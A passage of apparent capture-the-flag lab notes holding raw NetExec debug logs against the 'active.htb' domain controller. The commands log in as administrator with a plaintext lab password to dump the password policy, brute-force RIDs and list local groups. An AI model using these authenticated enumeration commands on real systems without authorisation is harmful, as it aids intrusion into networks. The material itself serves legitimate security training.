           DEBUG    smb hosts() - results: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None, None)]                                                         database.py:485
           DEBUG    users: <sqlalchemy.engine.cursor.CursorResult object at 0x7fec35535ef0>, hosts: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None,       database.py:362
                    None)]                                                                                                                                                                                                                  
           DEBUG    Calling command arguments                                                                                                                                                                              connection.py:241
           DEBUG    Calling pass_pol()                                                                                                                                                                                     connection.py:263
           DEBUG    Trying protocol 139/SMB                                                                                                                                                                                   passpol.py:105
[11:18:17] DEBUG    Protocol failed: Cannot request session (Called Name:10.129.175.223)                                                                                                                                      passpol.py:123
           DEBUG    Trying protocol 445/SMB                                                                                                                                                                                   passpol.py:105
[11:18:26] DEBUG    Found domain(s):                                                                                                                                                                                          passpol.py:231
           DEBUG    ACTIVE                                                                                                                                                                                                    passpol.py:233
           DEBUG    Builtin                                                                                                                                                                                                   passpol.py:233
[11:18:26] INFO     SMB         10.129.175.223  445    DC               Dumping password info for domain: ACTIVE                                                                                                              passpol.py:235
[11:18:26] INFO     SMB         10.129.175.223  445    DC               Minimum password length: 7                                                                                                                            passpol.py:237
[11:18:26] INFO     SMB         10.129.175.223  445    DC               Password history length: 24                                                                                                                           passpol.py:238
[11:18:26] INFO     SMB         10.129.175.223  445    DC               Maximum password age: 41 days 23 hours 53 minutes                                                                                                     passpol.py:239
[11:18:26] INFO     SMB         10.129.175.223  445    DC                                                                                                                                                                     passpol.py:240
[11:18:26] INFO     SMB         10.129.175.223  445    DC               Password Complexity Flags: 000001                                                                                                                     passpol.py:241
[11:18:26] INFO     SMB         10.129.175.223  445    DC                   Domain Refuse Password Change: 0                                                                                                                  passpol.py:244
[11:18:26] INFO     SMB         10.129.175.223  445    DC                   Domain Password Store Cleartext: 0                                                                                                                passpol.py:244
[11:18:26] INFO     SMB         10.129.175.223  445    DC                   Domain Password Lockout Admins: 0                                                                                                                 passpol.py:244
[11:18:26] INFO     SMB         10.129.175.223  445    DC                   Domain Password No Clear Change: 0                                                                                                                passpol.py:244
[11:18:26] INFO     SMB         10.129.175.223  445    DC                   Domain Password No Anon Change: 0                                                                                                                 passpol.py:244
[11:18:26] INFO     SMB         10.129.175.223  445    DC                   Domain Password Complex: 1                                                                                                                        passpol.py:244
[11:18:26] INFO     SMB         10.129.175.223  445    DC                                                                                                                                                                     passpol.py:246
[11:18:26] INFO     SMB         10.129.175.223  445    DC               Minimum password age: 1 day 4 minutes                                                                                                                 passpol.py:247
[11:18:26] INFO     SMB         10.129.175.223  445    DC               Reset Account Lockout Counter: 30 minutes                                                                                                             passpol.py:248
[11:18:26] INFO     SMB         10.129.175.223  445    DC               Locked Account Duration: 30 minutes                                                                                                                   passpol.py:249
[11:18:26] INFO     SMB         10.129.175.223  445    DC               Account Lockout Threshold: None                                                                                                                       passpol.py:250
[11:18:26] INFO     SMB         10.129.175.223  445    DC               Forced Log off Time: Not Set                                                                                                                          passpol.py:251
           DEBUG    Closing connection to: 10.129.175.223                                                                                                                                                                  connection.py:178
```


### --rid-brute
```sh
└─$ netexec smb 10.129.175.223 -u 'active.htb\administrator' -p 'Ticketmaster1968' --rid-brute --debug
[11:28:40] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
           DEBUG    PYTHON VERSION: 3.13.3 (main, Apr 10 2025, 21:38:51) [GCC 14.2.0]                                                                                                                                          netexec.py:81
           DEBUG    RUNNING ON: Linux Release: 6.12.33+kali-amd64                                                                                                                                                              netexec.py:82
           DEBUG    Passed args: Namespace(version=False, threads=256, timeout=None, jitter=None, verbose=False, debug=True, no_progress=False, log=None, force_ipv6=False, dns_server=None, dns_tcp=False, dns_timeout=3,     netexec.py:83
                    protocol='smb', target=['10.129.175.223'], username=['active.htb\\administrator'], password=['Ticketmaster1968'], cred_id=[], ignore_pw_decoding=False, no_bruteforce=False, continue_on_success=False,                 
                    gfail_limit=None, ufail_limit=None, fail_limit=None, kerberos=False, use_kcache=False, aesKey=None, kdcHost=None, pfx_cert=None, pfx_base64=None, pfx_pass=None, pem_cert=None, pem_key=None,                           
                    server='https', server_host='0.0.0.0', server_port=None, connectback_host=None, module=None, module_options=[], list_modules=False, show_module_options=False, hash=[], delegate=None, no_s4u2proxy=False,              
                    domain=None, local_auth=False, port=445, share='C$', smb_server_port=445, no_smbv1=False, gen_relay_list=None, smb_timeout=2, laps=None, generate_hosts_file=None, generate_krb5_file=None, sam=None,                   
                    lsa=None, ntds=None, dpapi=None, sccm=None, mkfile=None, pvk=None, enabled=False, userntds=None, shares=False, dir=None, interfaces=False, no_write_check=False, filter_shares=None, smb_sessions=False,                
                    disks=False, loggedon_users_filter=None, loggedon_users=None, users=None, users_export=None, groups=None, computers=None, local_groups=None, pass_pol=False, rid_brute=4000, qwinsta=False,                             
                    tasklist=False, wmi=None, wmi_namespace='root\\cimv2', spider=None, spider_folder='.', content=False, exclude_dirs='', depth=None, only_files=False, pattern=None, regex=None, put_file=None,                           
                    get_file=None, append_host=False, exec_method='wmiexec', dcom_timeout=5, get_output_tries=100, codec='utf-8', no_output=False, execute=None, ps_execute=None, obfs=False, amsi_bypass=None,                             
                    clear_obfscripts=False, force_ps32=False, no_encode=False)                                                                                                                                                              
           DEBUG    Protocol: smb                                                                                                                                                                                             netexec.py:137
           DEBUG    Protocol Path: /usr/lib/python3/dist-packages/nxc/protocols/smb.py                                                                                                                                        netexec.py:140
           DEBUG    Protocol DB Path: /usr/lib/python3/dist-packages/nxc/protocols/smb/database.py                                                                                                                            netexec.py:142
[11:28:41] DEBUG    symmetric using "pyCryptodomex" for "DES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "TDES"                                                                                                                                                                __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "AES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "RC4"                                                                                                                                                                 __init__.py:55
           DEBUG    Protocol Object: <class 'protocol.smb'>, type: <class 'type'>                                                                                                                                             netexec.py:145
           DEBUG    Protocol DB Object: <class 'protocol.database'>                                                                                                                                                           netexec.py:147
           DEBUG    DB Path: /home/kali/.nxc/workspaces/default/smb.db                                                                                                                                                        netexec.py:150
           DEBUG    Using selector: EpollSelector                                                                                                                                                                      selector_events.py:64
           DEBUG    Creating ThreadPoolExecutor                                                                                                                                                                                netexec.py:45
           DEBUG    Creating thread for <class 'protocol.smb'>                                                                                                                                                                 netexec.py:48
           INFO     Socket info: host=10.129.175.223, hostname=10.129.175.223, kerberos=False, ipv6=False, link-local ipv6=False                                                                                           connection.py:165
           DEBUG    Kicking off proto_flow                                                                                                                                                                                 connection.py:227
           INFO     Creating SMBv3 connection to 10.129.175.223                                                                                                                                                                   smb.py:606
[11:28:42] DEBUG    Created connection object                                                                                                                                                                              connection.py:232
[11:28:43] DEBUG    Server OS: Windows 7 / Server 2008 R2 Build 7601 6.1 build 7601                                                                                                                                               smb.py:280
[11:28:45] INFO     Creating SMBv1 connection to 10.129.175.223                                                                                                                                                                   smb.py:575
[11:28:46] INFO     SMBv1 disabled on 10.129.175.223                                                                                                                                                                              smb.py:598
           DEBUG    Update Hosts: [{'id': 3, 'ip': '10.129.175.223', 'hostname': 'DC', 'domain': 'active.htb', 'os': 'Windows 7 / Server 2008 R2 Build 7601', 'dc': None, 'smbv1': False, 'signing': True, 'spooler': None,  database.py:265
                    'zerologon': None, 'petitpotam': None}]                                                                                                                                                                                 
           DEBUG    add_host() - Host IDs Updated: [3]                                                                                                                                                                       database.py:275
[11:28:47] INFO     Error resolving hostname active.htb: [Errno -2] Name or service not known                                                                                                                              connection.py:192
           INFO     Resolved domain: active.htb with dns, kdcHost: None                                                                                                                                                           smb.py:321
[11:28:47] INFO     SMB         10.129.175.223  445    DC               Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)                                                      smb.py:327
           DEBUG    Trying to authenticate using plaintext with domain                                                                                                                                                     connection.py:497
           INFO     Creating SMBv3 connection to 10.129.175.223                                                                                                                                                                   smb.py:606
[11:28:49] DEBUG    Logged in with password to SMB with active.htb/administrator                                                                                                                                                  smb.py:468
           DEBUG    self.is_guest=False                                                                                                                                                                                           smb.py:470
           DEBUG    Checking if user is admin on 10.129.175.223                                                                                                                                                                   smb.py:646
[11:28:58] DEBUG    User is admin on 10.129.175.223!                                                                                                                                                                              smb.py:661
           DEBUG    Adding credential: active.htb/administrator:Ticketmaster1968                                                                                                                                                  smb.py:474
           DEBUG    Adding credentials: [{'id': 2, 'domain': 'active.htb', 'username': 'administrator', 'password': 'Ticketmaster1968', 'credtype': 'plaintext', 'pillaged_from_hostid': None}]                              database.py:332
           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
           DEBUG    filter_term is an IP address: 10.129.175.223                                                                                                                                                             database.py:133
           DEBUG    smb hosts() - results: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None, None)]                                                         database.py:485
[11:28:58] INFO     SMB         10.129.175.223  445    DC               active.htb\administrator:Ticketmaster1968 (Pwn3d!)                                                                                                        smb.py:481
           DEBUG    Adding admin user: active.htb/administrator:Ticketmaster1968@10.129.175.223                                                                                                                                   smb.py:486
           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
           DEBUG    filter_term is an IP address: 10.129.175.223                                                                                                                                                             database.py:133
           DEBUG    smb hosts() - results: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None, None)]                                                         database.py:485
           DEBUG    users: <sqlalchemy.engine.cursor.CursorResult object at 0x7f8027325f60>, hosts: [(3, '10.129.175.223', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None,       database.py:362
                    None)]                                                                                                                                                                                                                  
           DEBUG    Calling command arguments                                                                                                                                                                              connection.py:241
           DEBUG    Calling rid_brute()                                                                                                                                                                                    connection.py:263
           DEBUG    StringBinding ncacn_np:10.129.175.223[\pipe\lsarpc]                                                                                                                                                          smb.py:1435
[11:29:17] INFO     SMB         10.129.175.223  445    DC               498: ACTIVE\Enterprise Read-only Domain Controllers (SidTypeGroup)                                                                                       smb.py:1506
[11:29:17] INFO     SMB         10.129.175.223  445    DC               500: ACTIVE\Administrator (SidTypeUser)                                                                                                                  smb.py:1506
[11:29:17] INFO     SMB         10.129.175.223  445    DC               501: ACTIVE\Guest (SidTypeUser)                                                                                                                          smb.py:1506
[11:29:17] INFO     SMB         10.129.175.223  445    DC               502: ACTIVE\krbtgt (SidTypeUser)                                                                                                                         smb.py:1506
[11:29:17] INFO     SMB         10.129.175.223  445    DC               512: ACTIVE\Domain Admins (SidTypeGroup)                                                                                                                 smb.py:1506
[11:29:17] INFO     SMB         10.129.175.223  445    DC               513: ACTIVE\Domain Users (SidTypeGroup)                                                                                                                  smb.py:1506
[11:29:17] INFO     SMB         10.129.175.223  445    DC               514: ACTIVE\Domain Guests (SidTypeGroup)                                                                                                                 smb.py:1506
[11:29:17] INFO     SMB         10.129.175.223  445    DC               515: ACTIVE\Domain Computers (SidTypeGroup)                                                                                                              smb.py:1506
[11:29:17] INFO     SMB         10.129.175.223  445    DC               516: ACTIVE\Domain Controllers (SidTypeGroup)                                                                                                            smb.py:1506
[11:29:17] INFO     SMB         10.129.175.223  445    DC               517: ACTIVE\Cert Publishers (SidTypeAlias)                                                                                                               smb.py:1506
[11:29:17] INFO     SMB         10.129.175.223  445    DC               518: ACTIVE\Schema Admins (SidTypeGroup)                                                                                                                 smb.py:1506
[11:29:17] INFO     SMB         10.129.175.223  445    DC               519: ACTIVE\Enterprise Admins (SidTypeGroup)                                                                                                             smb.py:1506
[11:29:17] INFO     SMB         10.129.175.223  445    DC               520: ACTIVE\Group Policy Creator Owners (SidTypeGroup)                                                                                                   smb.py:1506
[11:29:17] INFO     SMB         10.129.175.223  445    DC               521: ACTIVE\Read-only Domain Controllers (SidTypeGroup)                                                                                                  smb.py:1506
[11:29:17] INFO     SMB         10.129.175.223  445    DC               553: ACTIVE\RAS and IAS Servers (SidTypeAlias)                                                                                                           smb.py:1506
[11:29:17] INFO     SMB         10.129.175.223  445    DC               571: ACTIVE\Allowed RODC Password Replication Group (SidTypeAlias)                                                                                       smb.py:1506
[11:29:17] INFO     SMB         10.129.175.223  445    DC               572: ACTIVE\Denied RODC Password Replication Group (SidTypeAlias)                                                                                        smb.py:1506
[11:29:30] INFO     SMB         10.129.175.223  445    DC               1000: ACTIVE\DC$ (SidTypeUser)                                                                                                                           smb.py:1506
[11:29:30] INFO     SMB         10.129.175.223  445    DC               1101: ACTIVE\DnsAdmins (SidTypeAlias)                                                                                                                    smb.py:1506
[11:29:30] INFO     SMB         10.129.175.223  445    DC               1102: ACTIVE\DnsUpdateProxy (SidTypeGroup)                                                                                                               smb.py:1506
[11:29:30] INFO     SMB         10.129.175.223  445    DC               1103: ACTIVE\SVC_TGS (SidTypeUser)                                                                                                                       smb.py:1506
[11:29:59] DEBUG    Closing connection to: 10.129.175.223                                                                                                                                                                  connection.py:178
```


### --local-group
```sh
└─$ netexec smb 10.129.172.255 -u 'active.htb\administrator' -p 'Ticketmaster1968' --local-group --debug
[07:41:43] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
           DEBUG    PYTHON VERSION: 3.13.5 (main, Jun 25 2025, 18:55:22) [GCC 14.2.0]                                                                                                                                          netexec.py:81
           DEBUG    RUNNING ON: Linux Release: 6.12.33+kali-amd64                                                                                                                                                              netexec.py:82
           DEBUG    Passed args: Namespace(version=False, threads=256, timeout=None, jitter=None, verbose=False, debug=True, no_progress=False, log=None, force_ipv6=False, dns_server=None, dns_tcp=False, dns_timeout=3,     netexec.py:83
                    protocol='smb', target=['10.129.172.255'], username=['active.htb\\administrator'], password=['Ticketmaster1968'], cred_id=[], ignore_pw_decoding=False, no_bruteforce=False, continue_on_success=False,                 
                    gfail_limit=None, ufail_limit=None, fail_limit=None, kerberos=False, use_kcache=False, aesKey=None, kdcHost=None, pfx_cert=None, pfx_base64=None, pfx_pass=None, pem_cert=None, pem_key=None,                           
                    server='https', server_host='0.0.0.0', server_port=None, connectback_host=None, module=None, module_options=[], list_modules=False, show_module_options=False, hash=[], delegate=None, no_s4u2proxy=False,              
                    domain=None, local_auth=False, port=445, share='C$', smb_server_port=445, no_smbv1=False, gen_relay_list=None, smb_timeout=2, laps=None, generate_hosts_file=None, generate_krb5_file=None, sam=None,                   
                    lsa=None, ntds=None, dpapi=None, sccm=None, mkfile=None, pvk=None, enabled=False, userntds=None, shares=False, dir=None, interfaces=False, no_write_check=False, filter_shares=None, smb_sessions=False,                
                    disks=False, loggedon_users_filter=None, loggedon_users=None, users=None, users_export=None, groups=None, computers=None, local_groups='', pass_pol=False, rid_brute=None, qwinsta=False, tasklist=False,               
                    wmi=None, wmi_namespace='root\\cimv2', spider=None, spider_folder='.', content=False, exclude_dirs='', depth=None, only_files=False, pattern=None, regex=None, put_file=None, get_file=None,                            
                    append_host=False, exec_method='wmiexec', dcom_timeout=5, get_output_tries=100, codec='utf-8', no_output=False, execute=None, ps_execute=None, obfs=False, amsi_bypass=None, clear_obfscripts=False,                    
                    force_ps32=False, no_encode=False)                                                                                                                                                                                      
           DEBUG    Protocol: smb                                                                                                                                                                                             netexec.py:137
           DEBUG    Protocol Path: /usr/lib/python3/dist-packages/nxc/protocols/smb.py                                                                                                                                        netexec.py:140
           DEBUG    Protocol DB Path: /usr/lib/python3/dist-packages/nxc/protocols/smb/database.py                                                                                                                            netexec.py:142
           DEBUG    symmetric using "pyCryptodomex" for "DES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "TDES"                                                                                                                                                                __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "AES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "RC4"                                                                                                                                                                 __init__.py:55
           DEBUG    Protocol Object: <class 'protocol.smb'>, type: <class 'type'>                                                                                                                                             netexec.py:145
           DEBUG    Protocol DB Object: <class 'protocol.database'>                                                                                                                                                           netexec.py:147
           DEBUG    DB Path: /home/kali/.nxc/workspaces/default/smb.db                                                                                                                                                        netexec.py:150
           DEBUG    Using selector: EpollSelector                                                                                                                                                                      selector_events.py:64
           DEBUG    Creating ThreadPoolExecutor                                                                                                                                                                                netexec.py:45
           DEBUG    Creating thread for <class 'protocol.smb'>                                                                                                                                                                 netexec.py:48
           INFO     Socket info: host=10.129.172.255, hostname=10.129.172.255, kerberos=False, ipv6=False, link-local ipv6=False                                                                                           connection.py:165
           DEBUG    Kicking off proto_flow                                                                                                                                                                                 connection.py:227
           INFO     Creating SMBv3 connection to 10.129.172.255                                                                                                                                                                   smb.py:606
[07:41:45] DEBUG    Created connection object                                                                                                                                                                              connection.py:232
           DEBUG    Server OS: Windows 7 / Server 2008 R2 Build 7601 6.1 build 7601                                                                                                                                               smb.py:280
[07:41:47] INFO     Creating SMBv1 connection to 10.129.172.255                                                                                                                                                                   smb.py:575
[07:41:49] INFO     SMBv1 disabled on 10.129.172.255                                                                                                                                                                              smb.py:598
           DEBUG    Update Hosts: [{'id': 4, 'ip': '10.129.172.255', 'hostname': 'DC', 'domain': 'active.htb', 'os': 'Windows 7 / Server 2008 R2 Build 7601', 'dc': None, 'smbv1': False, 'signing': True, 'spooler': None,  database.py:265
                    'zerologon': None, 'petitpotam': None}]                                                                                                                                                                                 
           DEBUG    add_host() - Host IDs Updated: [4]                                                                                                                                                                       database.py:275
           INFO     Error resolving hostname active.htb: [Errno -2] Name or service not known                                                                                                                              connection.py:192
           INFO     Resolved domain: active.htb with dns, kdcHost: None                                                                                                                                                           smb.py:321
[07:41:49] INFO     SMB         10.129.172.255  445    DC               Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)                                                      smb.py:327
           DEBUG    Trying to authenticate using plaintext with domain                                                                                                                                                     connection.py:497
           INFO     Creating SMBv3 connection to 10.129.172.255                                                                                                                                                                   smb.py:606
[07:41:51] DEBUG    Logged in with password to SMB with active.htb/administrator                                                                                                                                                  smb.py:468
           DEBUG    self.is_guest=False                                                                                                                                                                                           smb.py:470
           DEBUG    Checking if user is admin on 10.129.172.255                                                                                                                                                                   smb.py:646
[07:42:00] DEBUG    User is admin on 10.129.172.255!                                                                                                                                                                              smb.py:661
           DEBUG    Adding credential: active.htb/administrator:Ticketmaster1968                                                                                                                                                  smb.py:474
           DEBUG    Adding credentials: [{'id': 2, 'domain': 'active.htb', 'username': 'administrator', 'password': 'Ticketmaster1968', 'credtype': 'plaintext', 'pillaged_from_hostid': None}]                              database.py:332
           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
           DEBUG    filter_term is an IP address: 10.129.172.255                                                                                                                                                             database.py:133
           DEBUG    smb hosts() - results: [(4, '10.129.172.255', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None, None)]                                                         database.py:485
[07:42:00] INFO     SMB         10.129.172.255  445    DC               active.htb\administrator:Ticketmaster1968 (Pwn3d!)                                                                                                        smb.py:481
           DEBUG    Adding admin user: active.htb/administrator:Ticketmaster1968@10.129.172.255                                                                                                                                   smb.py:486
           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
           DEBUG    filter_term is an IP address: 10.129.172.255                                                                                                                                                             database.py:133
           DEBUG    smb hosts() - results: [(4, '10.129.172.255', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None, None)]                                                         database.py:485
           DEBUG    users: <sqlalchemy.engine.cursor.CursorResult object at 0x7fea12576040>, hosts: [(4, '10.129.172.255', 'DC', 'active.htb', 'Windows 7 / Server 2008 R2 Build 7601', None, False, True, None, None,       database.py:362
                    None)]                                                                                                                                                                                                                  
           DEBUG    Calling command arguments                                                                                                                                                                              connection.py:241
           DEBUG    Calling local_groups()                                                                                                                                                                                 connection.py:263
[07:42:00] INFO     SMB         10.129.172.255  445    DC               Enumerating with SAMRPC protocol                                                                                                                         smb.py:1270
           DEBUG    Binding to ncacn_np:445[\pipe\samr]                                                                                                                                                                      samrfunc.py:107
[07:42:14] INFO     SMB         10.129.172.255  445    DC               Enumerated local groups                                                                                                                                  smb.py:1278
[07:42:14] DEBUG    Local groups: {'Server Operators': 549, 'Account Operators': 548, 'Pre-Windows 2000 Compatible Access': 554, 'Incoming Forest Trust Builders': 557, 'Windows Authorization Access Group': 560, 'Terminal     smb.py:1279
                    Server License Servers': 561, 'Administrators': 544, 'Users': 545, 'Guests': 546, 'Print Operators': 550, 'Backup Operators': 551, 'Replicator': 552, 'Remote Desktop Users': 555, 'Network Configuration               
                    Operators': 556, 'Performance Monitor Users': 558, 'Performance Log Users': 559, 'Distributed COM Users': 562, 'IIS_IUSRS': 568, 'Cryptographic Operators': 569, 'Event Log Readers': 573, 'Certificate                 
                    Service DCOM Access': 574, 'Cert Publishers': 517, 'RAS and IAS Servers': 553, 'Allowed RODC Password Replication Group': 571, 'Denied RODC Password Replication Group': 572, 'DnsAdmins': 1101}                        
[07:42:14] INFO     SMB         10.129.172.255  445    DC               549 - Server Operators                                                                                                                                   smb.py:1282
           DEBUG    get_groups(filter_term=None, groupName=Server Operators, groupDomain=DC) => [(1, 'DC', 'Server Operators', '549', None, None)]                                                                           database.py:581
           DEBUG    Update Groups: [{'id': 1, 'domain': 'DC', 'name': 'Server Operators', 'rid': 549, 'member_count_ad': None, 'last_query_time': None}]                                                                     database.py:547
           DEBUG    Updated groups with IDs: [1]                                                                                                                                                                             database.py:558
           DEBUG    Added group, returned id: 1                                                                                                                                                                                  smb.py:1284
[07:42:14] INFO     SMB         10.129.172.255  445    DC               548 - Account Operators                                                                                                                                  smb.py:1282
           DEBUG    get_groups(filter_term=None, groupName=Account Operators, groupDomain=DC) => [(2, 'DC', 'Account Operators', '548', None, None)]                                                                         database.py:581
           DEBUG    Update Groups: [{'id': 2, 'domain': 'DC', 'name': 'Account Operators', 'rid': 548, 'member_count_ad': None, 'last_query_time': None}]                                                                    database.py:547
           DEBUG    Updated groups with IDs: [2]                                                                                                                                                                             database.py:558
           DEBUG    Added group, returned id: 2                                                                                                                                                                                  smb.py:1284
[07:42:14] INFO     SMB         10.129.172.255  445    DC               554 - Pre-Windows 2000 Compatible Access                                                                                                                 smb.py:1282
           DEBUG    get_groups(filter_term=None, groupName=Pre-Windows 2000 Compatible Access, groupDomain=DC) => [(3, 'DC', 'Pre-Windows 2000 Compatible Access', '554', None, None)]                                       database.py:581
           DEBUG    Update Groups: [{'id': 3, 'domain': 'DC', 'name': 'Pre-Windows 2000 Compatible Access', 'rid': 554, 'member_count_ad': None, 'last_query_time': None}]                                                   database.py:547
           DEBUG    Updated groups with IDs: [3]                                                                                                                                                                             database.py:558
           DEBUG    Added group, returned id: 3                                                                                                                                                                                  smb.py:1284
[07:42:14] INFO     SMB         10.129.172.255  445    DC               557 - Incoming Forest Trust Builders                                                                                                                     smb.py:1282
           DEBUG    get_groups(filter_term=None, groupName=Incoming Forest Trust Builders, groupDomain=DC) => [(4, 'DC', 'Incoming Forest Trust Builders', '557', None, None)]                                               database.py:581
           DEBUG    Update Groups: [{'id': 4, 'domain': 'DC', 'name': 'Incoming Forest Trust Builders', 'rid': 557, 'member_count_ad': None, 'last_query_time': None}]                                                       database.py:547
           DEBUG    Updated groups with IDs: [4]                                                                                                                                                                             database.py:558
           DEBUG    Added group, returned id: 4                                                                                                                                                                                  smb.py:1284
[07:42:14] INFO     SMB         10.129.172.255  445    DC               560 - Windows Authorization Access Group                                                                                                                 smb.py:1282
           DEBUG    get_groups(filter_term=None, groupName=Windows Authorization Access Group, groupDomain=DC) => [(5, 'DC', 'Windows Authorization Access Group', '560', None, None)]                                       database.py:581
           DEBUG    Update Groups: [{'id': 5, 'domain': 'DC', 'name': 'Windows Authorization Access Group', 'rid': 560, 'member_count_ad': None, 'last_query_time': None}]                                                   database.py:547
           DEBUG    Updated groups with IDs: [5]                                                                                                                                                                             database.py:558
           DEBUG    Added group, returned id: 5                                                                                                                                                                                  smb.py:1284
[07:42:14] INFO     SMB         10.129.172.255  445    DC               561 - Terminal Server License Servers                                                                                                                    smb.py:1282
           DEBUG    get_groups(filter_term=None, groupName=Terminal Server License Servers, groupDomain=DC) => [(6, 'DC', 'Terminal Server License Servers', '561', None, None)]                                             database.py:581
           DEBUG    Update Groups: [{'id': 6, 'domain': 'DC', 'name': 'Terminal Server License Servers', 'rid': 561, 'member_count_ad': None, 'last_query_time': None}]                                                      database.py:547
           DEBUG    Updated groups with IDs: [6]                                                                                                                                                                             database.py:558
           DEBUG    Added group, returned id: 6                                                                                                                                                                                  smb.py:1284
[07:42:14] INFO     SMB         10.129.172.255  445    DC               544 - Administrators                                                                                                                                     smb.py:1282
           DEBUG    get_groups(filter_term=None, groupName=Administrators, groupDomain=DC) => [(7, 'DC', 'Administrators', '544', None, None)]                                                                               database.py:581
           DEBUG    Update Groups: [{'id': 7, 'domain': 'DC', 'name': 'Administrators', 'rid': 544, 'member_count_ad': None, 'last_query_time': None}]                                                                       database.py:547
           DEBUG    Updated groups with IDs: [7]                                                                                                                                                                             database.py:558
           DEBUG    Added group, returned id: 7                                                                                                                                                                                  smb.py:1284
[07:42:14] INFO     SMB         10.129.172.255  445    DC               545 - Users                                                                                                                                              smb.py:1282
           DEBUG    get_groups(filter_term=None, groupName=Users, groupDomain=DC) => [(8, 'DC', 'Users', '545', None, None)]                                                                                                 database.py:581
           DEBUG    Update Groups: [{'id': 8, 'domain': 'DC', 'name': 'Users', 'rid': 545, 'member_count_ad': None, 'last_query_time': None}]                                                                                database.py:547
           DEBUG    Updated groups with IDs: [8]                                                                                                                                                                             database.py:558
           DEBUG    Added group, returned id: 8                                                                                                                                                                                  smb.py:1284
[07:42:14] INFO     SMB         10.129.172.255  445    DC               546 - Guests                                                                                                                                             smb.py:1282
           DEBUG    get_groups(filter_term=None, groupName=Guests, groupDomain=DC) => [(9, 'DC', 'Guests', '546', None, None)]                                                                                               database.py:581
           DEBUG    Update Groups: [{'id': 9, 'domain': 'DC', 'name': 'Guests', 'rid': 546, 'member_count_ad': None, 'last_query_time': None}]                                                                               database.py:547
           DEBUG    Updated groups with IDs: [9]                                                                                                                                                                             database.py:558
           DEBUG    Added group, returned id: 9                                                                                                                                                                                  smb.py:1284
[07:42:14] INFO     SMB         10.129.172.255  445    DC               550 - Print Operators                                                                                                                                    smb.py:1282
           DEBUG    get_groups(filter_term=None, groupName=Print Operators, groupDomain=DC) => [(10, 'DC', 'Print Operators', '550', None, None)]                                                                            database.py:581
           DEBUG    Update Groups: [{'id': 10, 'domain': 'DC', 'name': 'Print Operators', 'rid': 550, 'member_count_ad': None, 'last_query_time': None}]                                                                     database.py:547
           DEBUG    Updated groups with IDs: [10]                                                                                                                                                                            database.py:558
           DEBUG    Added group, returned id: 10                                                                                                                                                                                 smb.py:1284
[07:42:14] INFO     SMB         10.129.172.255  445    DC               551 - Backup Operators                                                                                                                                   smb.py:1282
           DEBUG    get_groups(filter_term=None, groupName=Backup Operators, groupDomain=DC) => [(11, 'DC', 'Backup Operators', '551', None, None)]                                                                          database.py:581
           DEBUG    Update Groups: [{'id': 11, 'domain': 'DC', 'name': 'Backup Operators', 'rid': 551, 'member_count_ad': None, 'last_query_time': None}]                                                                    database.py:547
           DEBUG    Updated groups with IDs: [11]                                                                                                                                                                            database.py:558
           DEBUG    Added group, returned id: 11                                                                                                                                                                                 smb.py:1284
[07:42:14] INFO     SMB         10.129.172.255  445    DC               552 - Replicator                                                                                                                                         smb.py:1282
           DEBUG    get_groups(filter_term=None, groupName=Replicator, groupDomain=DC) => [(12, 'DC', 'Replicator', '552', None, None)]                                                                                      database.py:581
           DEBUG    Update Groups: [{'id': 12, 'domain': 'DC', 'name': 'Replicator', 'rid': 552, 'member_count_ad': None, 'last_query_time': None}]                                                                          database.py:547
           DEBUG    Updated groups with IDs: [12]                                                                                                                                                                            database.py:558
           DEBUG    Added group, returned id: 12                                                                                                                                                                                 smb.py:1284
[07:42:14] INFO     SMB         10.129.172.255  445    DC               555 - Remote Desktop Users                                                                                                                               smb.py:1282
           DEBUG    get_groups(filter_term=None, groupName=Remote Desktop Users, groupDomain=DC) => [(13, 'DC', 'Remote Desktop Users', '555', None, None)]                                                                  database.py:581
           DEBUG    Update Groups: [{'id': 13, 'domain': 'DC', 'name': 'Remote Desktop Users', 'rid': 555, 'member_count_ad': None, 'last_query_time': None}]                                                                database.py:547
           DEBUG    Updated groups with IDs: [13]                                                                                                                                                                            database.py:558
           DEBUG    Added group, returned id: 13                                                                                                                                                                                 smb.py:1284
[07:42:14] INFO     SMB         10.129.172.255  445    DC               556 - Network Configuration Operators                                                                                                                    smb.py:1282
           DEBUG    get_groups(filter_term=None, groupName=Network Configuration Operators, groupDomain=DC) => [(14, 'DC', 'Network Configuration Operators', '556', None, None)]                                            database.py:581
           DEBUG    Update Groups: [{'id': 14, 'domain': 'DC', 'name': 'Network Configuration Operators', 'rid': 556, 'member_count_ad': None, 'last_query_time': None}]                                                     database.py:547
           DEBUG    Updated groups with IDs: [14]                                                                                                                                                                            database.py:558
           DEBUG    Added group, returned id: 14                                                                                                                                                                                 smb.py:1284
[07:42:14] INFO     SMB         10.129.172.255  445    DC               558 - Performance Monitor Users                                                                                                                          smb.py:1282
